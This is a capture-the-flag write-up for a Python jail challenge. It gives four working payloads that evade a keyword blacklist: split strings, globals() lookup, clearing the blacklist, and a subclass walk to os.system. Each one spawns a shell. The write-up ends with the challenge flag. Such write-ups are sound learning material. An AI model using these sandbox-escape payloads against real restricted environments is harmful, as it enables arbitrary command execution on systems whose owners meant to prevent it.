# Baby jail 2
## Write-up 

The setup of the second challenge is similar to the first one except that in this we have some filters, so the pyaload used in the challenge number won't work. We will have to find a bypass for these filters.

> **note** : for this challenge, there are multiple solutions.

### Solution 1

If we check what builtins are available using `__builtins__.__dict__` we'll find out that `__import__` is present but we can't write it directly since the program is checking if the word `import` is present in the input. That's why we will divide it into two parts.

```python
__builtins__.__dict__['__imp'+'ort__']
``` 

Now we will import the os module and get a shell.

```python
 __builtins__.__dict__['__imp'+'ort__']('os').system('s'+'h')
```

### Solution 2 

This is the general format of solution 1.

```python
globals()['__builtins__'].__dict__['__imp'+'ort__']('os').system('s'+'h')
```

### Solution 3

If we run the function `globals()` we can see the variable `BLACKLIST` which contains all the blacklisted characters, and since we have access to global variables, we can simply clear them.

```python
BLACKLIST.clear()
__import__('os').system('sh')

```

### Solution 4 

`Object --> os._wrap_close` 
```python
object.__subclasses__()[-4].__init__.__globals__['sys'].modules['os'].system('s'+'h')

```

## Flag

`shellmates{Y0u_ar3_st4rting_t0_g3t_g00d_with_LAVE}`